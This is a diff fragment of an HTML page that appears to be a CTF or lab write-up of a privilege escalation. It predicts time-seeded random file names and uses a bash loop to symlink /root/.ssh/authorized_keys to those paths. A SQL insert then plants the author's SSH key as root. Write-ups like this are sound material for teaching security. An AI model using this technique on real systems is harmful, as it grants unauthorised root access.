+<span class="n">snprintf</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%d%s"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar2</span><span class="p">,</span><span class="n">lVar3</span><span class="p">);</span><span class="w"></span>
+<span class="n">sVar5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">local_c8</span><span class="p">);</span><span class="w"></span>
+<span class="n">md5sum</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="n">sVar5</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">,</span><span class="n">local_f8</span><span class="p">,</span><span class="n">sVar5</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">);</span><span class="w"></span>
+<span class="n">snprintf</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%s%s"</span><span class="p">,</span><span class="s">"/var/local/"</span><span class="p">,</span><span class="n">local_f8</span><span class="p">);</span><span class="w"></span>
+<span class="n">local_40</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fopen</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="s">"w"</span><span class="p">);</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Seems confuddling? We actually already have everything we need to know to determine where the file is saved.
  <code>
@@ -1290,15 +1329,17 @@ local_40 = fopen(local_98,"w");
  </code>
  after the randomly generated number is because this will be the id of the row that I will insert my payload into on the MySQL table.
 </p>
-<pre class="codehilite"><code class="language-C">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;time.h&gt;
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>
 
-int main() {
-    srand(time(0));
-    printf("%d1", rand());
-}
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span><span class="w"></span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"%d1"</span><span class="p">,</span><span class="w"> </span><span class="n">rand</span><span class="p">());</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  I then compiled and uploaded the binary to the machine and executed the following bash to create the symbolic links to
  <code>
@@ -1306,8 +1347,10 @@ int main() {
  </code>
  .
 </p>
-<pre class="codehilite"><code class="language-bash">while :; do ln -s /root/.ssh/authorized_keys "/var/local/$(./exploit | md5sum | cut -c -32)" 2&gt;/dev/null; done
+<div class="codehilite">
+ <pre><span></span><code><span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> ln -s /root/.ssh/authorized_keys <span class="s2">"/var/local/</span><span class="k">$(</span>./exploit <span class="p">|</span> md5sum <span class="p">|</span> cut -c -32<span class="k">)</span><span class="s2">"</span> <span class="m">2</span>&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
 </code></pre>
+</div>
 <p>
  Finally we just need to insert our public SSH key into the table
  <code>
@@ -1315,8 +1358,10 @@ int main() {
  </code>
  with the id of 1. I did this using the follow SQL query.
 </p>
-<pre class="codehilite"><code class="language-sql">insert into messages values (1, "", "", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvS6g5B96A8D2JL25Pwe0fZc+LmeecPn71xo2ozSxk5maKZSL/2TQ4Rvm0HbmTKeGElB/mAPw1hTq8FUsvcK++MiMwdEijWGPwXvFMgFGA/YIsKAD/5cvG0ZpkZYi20VvOb6MnafpuCjqgjGFs1a1yYfafVOXadAYkWDvB9gAegeHpW0gAyose/5Z4/K7QuqujfKji6jklQBiPyr+BF+KPSo8cwfaTvkd7j0k1qbeHxS383IUnyF3qi0hxWO4ZZi7iky4pLDY+td++7uc42en6x30kLD2GtC2Px9T7PB3PhfDOJlWS71nuBUy2wqqQp7pwf5Q0ZdNvMajJvkU+9l3y/+02ynRpLG+5ukaZkcyGorwCckWW3AZEzSbHyW9mhSU57lH4NGR7zs0AfQEuQhwFcG+PqGSk2t1dACj1SIt4FoeDm7+qqoDCoSUzY7M4CpYpJLE534gsmh3uyzDY2TR5wNNOxA1CaqZnEnHNv9YS9Vm2eJWpTyukI1eIMvAVlk0= ghost@yourshell");
+<div class="codehilite">
+ <pre><span></span><code><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">messages</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="ss">""</span><span class="p">,</span><span class="w"> </span><span class="ss">""</span><span class="p">,</span><span class="w"> </span><span class="ss">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvS6g5B96A8D2JL25Pwe0fZc+LmeecPn71xo2ozSxk5maKZSL/2TQ4Rvm0HbmTKeGElB/mAPw1hTq8FUsvcK++MiMwdEijWGPwXvFMgFGA/YIsKAD/5cvG0ZpkZYi20VvOb6MnafpuCjqgjGFs1a1yYfafVOXadAYkWDvB9gAegeHpW0gAyose/5Z4/K7QuqujfKji6jklQBiPyr+BF+KPSo8cwfaTvkd7j0k1qbeHxS383IUnyF3qi0hxWO4ZZi7iky4pLDY+td++7uc42en6x30kLD2GtC2Px9T7PB3PhfDOJlWS71nuBUy2wqqQp7pwf5Q0ZdNvMajJvkU+9l3y/+02ynRpLG+5ukaZkcyGorwCckWW3AZEzSbHyW9mhSU57lH4NGR7zs0AfQEuQhwFcG+PqGSk2t1dACj1SIt4FoeDm7+qqoDCoSUzY7M4CpYpJLE534gsmh3uyzDY2TR5wNNOxA1CaqZnEnHNv9YS9Vm2eJWpTyukI1eIMvAVlk0= ghost@yourshell"</span><span class="p">);</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  How I checked to see if my exploit was working correctly was by creating the symbolic link to a file that I could view. When I saw my payload pop into that file I went...
 </p>
@@ -1344,7 +1389,7 @@ int main() {
 </div>
 </div>
 </section>
-<section class="wrapper style3 ">
+<section class="wrapper style5 ">
 <div class="inner">
 <div class="content">
 
